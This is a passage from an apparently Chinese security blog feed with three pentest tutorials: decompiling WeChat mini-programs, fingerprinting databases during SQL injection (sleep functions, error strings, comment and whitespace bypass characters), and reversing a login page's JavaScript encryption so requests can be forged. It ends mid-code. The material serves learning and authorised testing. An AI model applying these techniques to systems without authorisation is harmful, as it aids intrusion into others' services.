<p><img src="/../images/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91%E6%96%B9%E6%B3%95/image-20221204162126779.png" alt="image-20221204162126779"></p>
<h2 id="2-3-反编译小程序包"><a href="#2-3-反编译小程序包" class="headerlink" title="2.3 反编译小程序包"></a>2.3 反编译小程序包</h2><p>先反编译主包,进入wxappUnpacker目录,执行命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">node wuWxapkg.js &quot;小程序包地址&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/../images/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91%E6%96%B9%E6%B3%95/image-20221204162852271.png" alt="image-20221204162852271"></p>
<p>执行完成之后会在小程序包目录生成一个同名文件夹,里面就是小程序反编译后的源码</p>
<p><img src="/../images/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91%E6%96%B9%E6%B3%95/image-20221204162951377.png" alt="image-20221204162951377"></p>
<p>然后反编译分包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">node wuWxapkg.js &quot;小程序包地址&quot; -s=存放路径</span><br></pre></td></tr></table></figure>

<p>经过上面对主包和子包分别反编译之后会生成两个文件夹。</p>
<p><img src="/../images/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91%E6%96%B9%E6%B3%95/image-20221204163822456.png" alt="image-20221204163822456"></p>
<h2 id="2-4-包合并"><a href="#2-4-包合并" class="headerlink" title="2.4 包合并"></a>2.4 包合并</h2><p>进入主包的文件夹,找到app.json-&gt;subPackages-&gt;root属性</p>
<p><img src="/../images/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91%E6%96%B9%E6%B3%95/image-20221204164020516.png" alt="image-20221204164020516"></p>
<p>packageA即为定义的子包文件夹,将子包与该文件夹替换即可</p>
]]></content>
      <tags>
        <tag>微信小程序</tag>
        <tag>反编译</tag>
      </tags>
  </entry>
  <entry>
    <title>注入中判断数据库方法小结</title>
    <url>//blogs/sqli_dbms/</url>
    <content><![CDATA[<p>在进行SQL注入之前，首先要判断数据库类型，只有这样才能根据类型选择合适的函数，实现SQL注入</p>
<h2 id="1-数据库常见的搭配方式"><a href="#1-数据库常见的搭配方式" class="headerlink" title="1.数据库常见的搭配方式"></a>1.数据库常见的搭配方式</h2><table>
<thead>
<tr>
<th>语言</th>
<th>数据库</th>
</tr>
</thead>
<tbody><tr>
<td>asp</td>
<td>mssql，access</td>
</tr>
<tr>
<td>.net</td>
<td>mssql</td>
</tr>
<tr>
<td>php</td>
<td>mysql</td>
</tr>
<tr>
<td>java</td>
<td>oracle，mysql</td>
</tr>
</tbody></table>
<h2 id="2-基于特定函数判断"><a href="#2-基于特定函数判断" class="headerlink" title="2.基于特定函数判断"></a>2.基于特定函数判断</h2><h3 id="2-1-len-和length"><a href="#2-1-len-和length" class="headerlink" title="2.1 len()和length()"></a>2.1 len()和length()</h3><p>len()：返回字符串的长度，mssql适用</p>
<p>length()：返回字符串的长度，oracle、mysql适用</p>
<h3 id="2-2-version-和-version"><a href="#2-2-version-和-version" class="headerlink" title="2.2 version()和@@version"></a>2.2 version()和@@version</h3><p>version()：查询版本信息的函数，mysql适用</p>
<p>@@version：查询版本信息的函数，mysql、mssql适用</p>
<h3 id="2-3-substring-和substr"><a href="#2-3-substring-和substr" class="headerlink" title="2.3 substring()和substr()"></a>2.3 substring()和substr()</h3><p>substring()：字符串截取函数，mysql、mssql适用</p>
<p>substr()：字符串截取函数，mysql、oracle适用</p>
<p>两个函数用法一样</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">substring(str,pos,length)</span><br><span class="line">substring(被截取字符串,从第几位开始截取,截取长度)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; select substring(&#x27;abc&#x27;,2);</span><br><span class="line">+--------------------+</span><br><span class="line">| substring(&#x27;abc&#x27;,2) |</span><br><span class="line">+--------------------+</span><br><span class="line">| bc                 |</span><br><span class="line">+--------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select substring(&#x27;abc&#x27;,2,1);</span><br><span class="line">+----------------------+</span><br><span class="line">| substring(&#x27;abc&#x27;,2,1) |</span><br><span class="line">+----------------------+</span><br><span class="line">| b                    |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h3 id="2-4-特有的休眠函数"><a href="#2-4-特有的休眠函数" class="headerlink" title="2.4 特有的休眠函数"></a>2.4 特有的休眠函数</h3><p>mysql：benchmark()</p>
<p>mssql：waitfor delay ‘0:0:10’</p>
<p>oracle：DBMS_PIPE.RECEIVE_MESSAGE()</p>
<h2 id="2-基于报错信息判断"><a href="#2-基于报错信息判断" class="headerlink" title="2.基于报错信息判断"></a>2.基于报错信息判断</h2><p>mysql：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">you have an error in your SQL syntax,check the manual that corresponds to you mysql server version for the right stntax to use near &#x27;&#x27;foo&#x27; at line x</span><br></pre></td></tr></table></figure>

<p>mssql：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sg 170,level 15, State 1,Line 1</span><br><span class="line">Line 1:Incorrect syntax near ‘foo</span><br><span class="line">Msg 105,level 15,state 1,Line 1</span><br><span class="line">Unclose quotation mark before the character string ‘foo</span><br></pre></td></tr></table></figure>

<p>oracle：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ORA-01756:quoted string not properly terminated</span><br><span class="line">ORA-00933:SQLcommand not properly ended</span><br></pre></td></tr></table></figure>

<h2 id="3-基于注释符判断"><a href="#3-基于注释符判断" class="headerlink" title="3.基于注释符判断"></a>3.基于注释符判断</h2><p>mysql：# – &#x2F;**&#x2F;</p>
<p>mssql：– &#x2F;**&#x2F;</p>
<p>oracle：– &#x2F;**&#x2F;</p>
<h2 id="4-基于空白字符判断"><a href="#4-基于空白字符判断" class="headerlink" title="4.基于空白字符判断"></a>4.基于空白字符判断</h2><p>mysql：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%20 %09 %0a %0b %0c %0d %a0</span><br></pre></td></tr></table></figure>

<p>mssql：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x00-0x20</span><br></pre></td></tr></table></figure>

<p>oracle：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%20 %09 %00 %0a %0b %0c %0d</span><br></pre></td></tr></table></figure>

<p>oracle不能用%a0</p>
<p>mysql不能用%00</p>
]]></content>
      <tags>
        <tag>SQL注入</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次js加密算法逆向</title>
    <url>//blogs/js_decrypt/</url>
    <content><![CDATA[<h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h1><p>随着企业对安全越来越重视,前端加密也称为了企业防护的重要手段,以下过程仅记录学习过程</p>
<h1 id="2-过程"><a href="#2-过程" class="headerlink" title="2.过程"></a>2.过程</h1><h2 id="2-1-加密"><a href="#2-1-加密" class="headerlink" title="2.1 加密"></a>2.1 加密</h2><p>就拿登录功能为例,浏览器抓一下登录的包</p>
<p><img src="/../images/%E8%AE%B0%E4%B8%80%E6%AC%A1js%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91/image-20221122195844875.png" alt="image-20221122195844875"></p>
<p><img src="/../images/%E8%AE%B0%E4%B8%80%E6%AC%A1js%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91/image-20221122195913886.png" alt="image-20221122195913886"></p>
<p>请求包和返回包都经过了加密,要想继续渗透下去,就得找一下加解密的方法,才可以自己构造数据包</p>
<p>全局搜索<strong>secJson</strong></p>
<p><img src="/../images/%E8%AE%B0%E4%B8%80%E6%AC%A1js%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91/image-20221122200100713.png" alt="image-20221122200100713"></p>
<p>只有这一个js文件中存在,跟进去再搜一下<strong>secJson</strong></p>
<p><img src="/../images/%E8%AE%B0%E4%B8%80%E6%AC%A1js%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91/image-20221122202103879.png" alt="image-20221122202103879"></p>
<p>一共有三处,很明显可以得知t即为加密过后的参数,在可疑的地方加上断点重新请求</p>
<p><img src="/../images/%E8%AE%B0%E4%B8%80%E6%AC%A1js%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91/image-20221122202536553.png" alt="image-20221122202536553"></p>
<p>可以看到e为原始数据包的内容,原数据包的内容为</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;mobile&quot;</span><span class="punctuation">:</span><span class="string">&quot;18888888888&quot;</span><span class="punctuation">,</span><span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;86e2rL/E5dA4KAJuLa3wPw==&quot;</span><span class="punctuation">,</span><span class="attr">&quot;zoneCode&quot;</span><span class="punctuation">:</span><span class="string">&quot;86&quot;</span><span class="punctuation">,</span><span class="attr">&quot;captchaId&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;verificationCode&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>密码也是加密的,我们先不管,主要是解密整个数据包,t为加密过后的数据包,看内容,数据包是经过了两次处理</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> t = <span class="title class_">Object</span>(y.<span class="property">b</span>)(e);</span><br><span class="line"><span class="keyword">return</span> t = <span class="title function_">u</span>(t = t.<span class="title function_">split</span>(<span class="string">&quot;&quot;</span>).<span class="title function_">reverse</span>().<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>))</span><br></pre></td></tr></table></figure>

<p>一次是由y.b处理,一次是由u处理,我们首先跟进y.b</p>
<p>找到y.b的内容,自己设置一个函数名,直接放js里面调试一下</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">encrypt</span>(<span class="params">e</span>)&#123; 			<span class="comment">//e为原始数据包</span></span><br><span class="line">    <span class="keyword">var</span> t = <span class="string">&quot;&quot;</span></span><br><span class="line">      , o = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , i = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , a = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , n = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , l = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , b = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , s = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , c = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (e = <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> t = <span class="built_in">encodeURIComponent</span>(e), o = [], i = <span class="number">0</span>; i &lt; t.<span class="property">length</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">var</span> r = t.<span class="title function_">charAt</span>(i);</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&quot;%&quot;</span> === r) &#123;</span><br><span class="line">                <span class="keyword">var</span> a = t.<span class="title function_">charAt</span>(i + <span class="number">1</span>) + t.<span class="title function_">charAt</span>(i + <span class="number">2</span>)</span><br><span class="line">                  , n = <span class="built_in">parseInt</span>(a, <span class="number">16</span>);</span><br><span class="line">                o.<span class="title function_">push</span>(n),</span><br><span class="line">                i += <span class="number">2</span></span><br><span class="line">            &#125; <span class="keyword">else</span></span><br><span class="line">                o.<span class="title function_">push</span>(r.<span class="title function_">charCodeAt</span>(<span class="number">0</span>))</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> o.<span class="title function_">map</span>((<span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(e)</span><br><span class="line">        &#125;</span><br><span class="line">        )).<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">    &#125;(e); c &lt; e.<span class="property">length</span>; )</span><br><span class="line">        o = e.<span class="title function_">charCodeAt</span>(c++),</span><br><span class="line">        i = e.<span class="title function_">charCodeAt</span>(c++),</span><br><span class="line">        a = e.<span class="title function_">charCodeAt</span>(c++),</span><br><span class="line">        n = o &gt;&gt; <span class="number">2</span>,</span><br><span class="line">        l = (<span class="number">3</span> &amp; o) &lt;&lt; <span class="number">4</span> | i &gt;&gt; <span class="number">4</span>,</span><br><span class="line">        b = (<span class="number">15</span> &amp; i) &lt;&lt; <span class="number">2</span> | a &gt;&gt; <span class="number">6</span>,</span><br><span class="line">        s = <span class="number">63</span> &amp; a,</span><br><span class="line">        <span class="built_in">isNaN</span>(i) ? b = s = <span class="number">64</span> : <span class="built_in">isNaN</span>(a) &amp;&amp; (s = <span class="number">64</span>),</span><br><span class="line">        t = t + r.<span class="title function_">charAt</span>(n) + r.<span class="title function_">charAt</span>(l) + r.<span class="title function_">charAt</span>(b) + r.<span class="title function_">charAt</span>(s);</span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>没有错误就可以找下一个函数u,将内容复制到js里面调试一下</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">u</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> t = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , o = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , i = <span class="string">&quot;&quot;</span></span><br><span class="line">      , r = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> e.<span class="property">length</span> % <span class="number">2</span> ? (r = (e.<span class="property">length</span> + <span class="number">1</span>) / <span class="number">2</span>,</span><br><span class="line">    t = e.<span class="title function_">substring</span>(<span class="number">1</span>, r),</span><br><span class="line">    o = e.<span class="title function_">substring</span>(r),</span><br><span class="line">    i = e.<span class="title function_">substring</span>(<span class="number">0</span>, <span class="number">1</span>) + o + t) : (r = e.<span class="property">length</span> / <span class="number">2</span>,</span><br><span class="line">    t = e.<span class="title function_">substring</span>(<span class="number">0</span>, r),</span><br><span class="line">    i = (o = e.<span class="title function_">substring</span>(r)) + t),</span><br><span class="line">    i</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后我们传入参数e,根据原来的处理方法处理,最后赋值给encryptResult,当只有这两个函数时,经调试会报出错误</p>
<p><img src="/../images/%E8%AE%B0%E4%B8%80%E6%AC%A1js%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91/image-20221122204449873.png" alt="image-20221122204449873"></p>
<p>r未定义,再从刚刚两个函数的位置上下翻一下r的值</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> r = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;</span></span><br></pre></td></tr></table></figure>

<p>最后代码为</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> r = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">encrypt</span>(<span class="params">e</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> t = <span class="string">&quot;&quot;</span></span><br><span class="line">      , o = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , i = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , a = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , n = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , l = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , b = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , s = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , c = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (e = <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> t = <span class="built_in">encodeURIComponent</span>(e), o = [], i = <span class="number">0</span>; i &lt; t.<span class="property">length</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">var</span> r = t.<span class="title function_">charAt</span>(i);</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&quot;%&quot;</span> === r) &#123;</span><br><span class="line">                <span class="keyword">var</span> a = t.<span class="title function_">charAt</span>(i + <span class="number">1</span>) + t.<span class="title function_">charAt</span>(i + <span class="number">2</span>)</span><br><span class="line">                  , n = <span class="built_in">parseInt</span>(a, <span class="number">16</span>);</span><br><span class="line">                o.<span class="title function_">push</span>(n),</span><br><span class="line">                i += <span class="number">2</span></span><br><span class="line">            &#125; <span class="keyword">else</span></span><br><span class="line">                o.<span class="title function_">push</span>(r.<span class="title function_">charCodeAt</span>(<span class="number">0</span>))</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> o.<span class="title function_">map</span>((<span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(e)</span><br><span class="line">        &#125;</span><br><span class="line">        )).<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">    &#125;(e); c &lt; e.<span class="property">length</span>; )</span><br><span class="line">        o = e.<span class="title function_">charCodeAt</span>(c++),</span><br><span class="line">        i = e.<span class="title function_">charCodeAt</span>(c++),</span><br><span class="line">        a = e.<span class="title function_">charCodeAt</span>(c++),</span><br><span class="line">        n = o &gt;&gt; <span class="number">2</span>,</span><br><span class="line">        l = (<span class="number">3</span> &amp; o) &lt;&lt; <span class="number">4</span> | i &gt;&gt; <span class="number">4</span>,</span><br><span class="line">        b = (<span class="number">15</span> &amp; i) &lt;&lt; <span class="number">2</span> | a &gt;&gt; <span class="number">6</span>,</span><br><span class="line">        s = <span class="number">63</span> &amp; a,</span><br><span class="line">        <span class="built_in">isNaN</span>(i) ? b = s = <span class="number">64</span> : <span class="built_in">isNaN</span>(a) &amp;&amp; (s = <span class="number">64</span>),</span><br><span class="line">        t = t + r.<span class="title function_">charAt</span>(n) + r.<span class="title function_">charAt</span>(l) + r.<span class="title function_">charAt</span>(b) + r.<span class="title function_">charAt</span>(s);</span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> t = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , o = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , i = <span class="string">&quot;&quot;</span></span><br><span class="line">      , r = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> e.<span class="property">length</span> % <span class="number">2</span> ? (r = (e.<span class="property">length</span> + <span class="number">1</span>) / <span class="number">2</span>,</span><br><span class="line">    t = e.<span class="title function_">substring</span>(<span class="number">1</span>, r),</span><br><span class="line">    o = e.<span class="title function_">substring</span>(r),</span><br><span class="line">    i = e.<span class="title function_">substring</span>(<span class="number">0</span>, <span class="number">1</span>) + o + t) : (r = e.<span class="property">length</span> / <span class="number">2</span>,</span><br><span class="line">    t = e.<span class="title function_">substring</span>(<span class="number">0</span>, r),</span><br><span class="line">    i = (o = e.<span class="title function_">substring</span>(r)) + t),</span><br><span class="line">    i</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> e = <span class="string">&quot;&#123;\&quot;mobile\&quot;:\&quot;18888888888\&quot;,\&quot;password\&quot;:\&quot;86e2rL/E5dA4KAJuLa3wPw==\&quot;,\&quot;zoneCode\&quot;:\&quot;86\&quot;,\&quot;captchaId\&quot;:\&quot;\&quot;,\&quot;verificationCode\&quot;:\&quot;\&quot;&#125;&quot;</span></span><br><span class="line"><span class="keyword">var</span> t = <span class="title function_">encrypt</span>(e)</span><br><span class="line">t = <span class="title function_">u</span>(t = t.<span class="title function_">split</span>(<span class="string">&quot;&quot;</span>).<span class="title function_">reverse</span>().<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>))</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(t)</span><br></pre></td></tr></table></figure>

<p>运行一下得到加密结果</p>
<p><img src="/../images/%E8%AE%B0%E4%B8%80%E6%AC%A1js%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91/image-20221122204914285.png" alt="image-20221122204914285"></p>
<p>和请求包中的数据一样,证明加密方法是正确的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">secJson</span><br><span class="line">: </span><br><span class="line">&quot;zdQd3MhxUdKF0S0EEZ1U0LMJnMlZDOiojIkJ3b3N3chBnIsICO4gDO4gDO4gDOxIiOiUGbpJ2btJye==QfiIiOiUGZvNkbvlGdhNWamlmclZnIsIiI6ICZJFGajRHchNmIsIiN4IiOiUGZvNUZu9meiwiI90&quot;</span><br></pre></td></tr></table></figure>

<h2 id="2-2-解密"><a href="#2-2-解密" class="headerlink" title="2.2 解密"></a>2.2 解密</h2><p>返回包也为加密的,先看一下返回包的特征,和请求包一样的格式,同样是找<strong>secJson</strong>,刚刚有三个,接下的的两个我们也找可疑的地方下断点,如果一眼看不出来可以多下断点,慢慢调</p>
<p><img src="/../images/%E8%AE%B0%E4%B8%80%E6%AC%A1js%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91/image-20221122205538326.png" alt="image-20221122205538326"></p>
<p>e的值和返回包的值一样,基本可以确认这是解密返回包的代码,解密也是通过两次处理获得最后的数据</p>
<p>u处理一次,y.a处理一次,跟进两个函数复制出来,u我们之前已经有了,只复制一下y.a即可,给函数重命名之后放js里</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">decrypt</span>(<span class="params">e</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> t = <span class="string">&quot;&quot;</span></span><br><span class="line">      , o = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , i = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , a = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , n = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , l = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , b = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , s = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , c = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (e = e.<span class="title function_">replace</span>(<span class="regexp">/[^A-Za-z0-9+/=]/g</span>, <span class="string">&quot;&quot;</span>); c &lt; e.<span class="property">length</span>; )</span><br><span class="line">        n = r.<span class="title function_">indexOf</span>(e.<span class="title function_">charAt</span>(c++)),</span><br><span class="line">        l = r.<span class="title function_">indexOf</span>(e.<span class="title function_">charAt</span>(c++)),</span><br><span class="line">        b = r.<span class="title function_">indexOf</span>(e.<span class="title function_">charAt</span>(c++)),</span><br><span class="line">        s = r.<span class="title function_">indexOf</span>(e.<span class="title function_">charAt</span>(c++)),</span><br><span class="line">        o = n &lt;&lt; <span class="number">2</span> | l &gt;&gt; <span class="number">4</span>,</span><br><span class="line">        i = (<span class="number">15</span> &amp; l) &lt;&lt; <span class="number">4</span> | b &gt;&gt; <span class="number">2</span>,</span><br><span class="line">        a = (<span class="number">3</span> &amp; b) &lt;&lt; <span class="number">6</span> | s,</span><br><span class="line">        t += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(o),</span><br><span class="line">        <span class="number">64</span> != b &amp;&amp; (t += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(i)),</span><br><span class="line">        <span class="number">64</span> != s &amp;&amp; (t += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(a));</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> t = e.<span class="title function_">split</span>(<span class="string">&quot;&quot;</span>).<span class="title function_">map</span>((<span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> e.<span class="title function_">charCodeAt</span>(<span class="number">0</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        )), o = <span class="string">&quot;&quot;</span>, i = <span class="number">0</span>; i &lt; t.<span class="property">length</span>; i++)</span><br><span class="line">            o += <span class="string">&quot;%&quot;</span> + t[i].<span class="title function_">toString</span>(<span class="number">16</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">decodeURIComponent</span>(o)</span><br><span class="line">    &#125;(t)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>传入返回包执行一下,完整代码为</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> r = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> t = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , o = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , i = <span class="string">&quot;&quot;</span></span><br><span class="line">      , r = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> e.<span class="property">length</span> % <span class="number">2</span> ? (r = (e.<span class="property">length</span> + <span class="number">1</span>) / <span class="number">2</span>,</span><br><span class="line">    t = e.<span class="title function_">substring</span>(<span class="number">1</span>, r),</span><br><span class="line">    o = e.<span class="title function_">substring</span>(r),</span><br><span class="line">    i = e.<span class="title function_">substring</span>(<span class="number">0</span>, <span class="number">1</span>) + o + t) : (r = e.<span class="property">length</span> / <span class="number">2</span>,</span><br><span class="line">    t = e.<span class="title function_">substring</span>(<span class="number">0</span>, r),</span><br><span class="line">    i = (o = e.<span class="title function_">substring</span>(r)) + t),</span><br><span class="line">    i</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">decrypt</span>(<span class="params">e</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> t = <span class="string">&quot;&quot;</span></span><br><span class="line">      , o = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , i = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , a = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , n = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , l = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , b = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , s = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , c = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (e = e.<span class="title function_">replace</span>(<span class="regexp">/[^A-Za-z0-9+/=]/g</span>, <span class="string">&quot;&quot;</span>); c &lt; e.<span class="property">length</span>; )</span><br><span class="line">        n = r.<span class="title function_">indexOf</span>(e.<span class="title function_">charAt</span>(c++)),</span><br><span class="line">        l = r.<span class="title function_">indexOf</span>(e.<span class="title function_">charAt</span>(c++)),</span><br><span class="line">        b = r.<span class="title function_">indexOf</span>(e.<span class="title function_">charAt</span>(c++)),</span><br><span class="line">        s = r.<span class="title function_">indexOf</span>(e.<span class="title function_">charAt</span>(c++)),</span><br><span class="line">        o = n &lt;&lt; <span class="number">2</span> | l &gt;&gt; <span class="number">4</span>,</span><br><span class="line">        i = (<span class="number">15</span> &amp; l) &lt;&lt; <span class="number">4</span> | b &gt;&gt; <span class="number">2</span>,</span><br><span class="line">        a = (<span class="number">3</span> &amp; b) &lt;&lt; <span class="number">6</span> | s,</span><br><span class="line">        t += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(o),</span><br><span class="line">        <span class="number">64</span> != b &amp;&amp; (t += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(i)),</span><br><span class="line">        <span class="number">64</span> != s &amp;&amp; (t += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(a));</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> t = e.<span class="title function_">split</span>(<span class="string">&quot;&quot;</span>).<span class="title function_">map</span>((<span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> e.<span class="title function_">charCodeAt</span>(<span class="number">0</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        )), o = <span class="string">&quot;&quot;</span>, i = <span class="number">0</span>; i &lt; t.<span class="property">length</span>; i++)</span><br><span class="line">            o += <span 